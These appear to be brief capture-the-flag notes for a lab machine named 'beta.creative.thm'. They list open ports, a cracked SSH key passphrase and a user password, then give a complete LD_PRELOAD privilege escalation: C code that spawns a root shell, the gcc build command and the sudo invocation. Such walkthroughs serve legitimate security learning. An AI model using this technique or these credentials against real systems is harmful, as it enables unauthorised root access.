nmap = p22, p80

beta.creative.thm

localhost:1337
ssh2john id_rsa = sweetness

saad:MyStrongestPasswordYet$4291

env_keep += LD_PRELOAD, we use this to escalate privelege

make a C file with the code
'''C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
'''

run the following steps

'''
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
id
whoami
'''

You are root
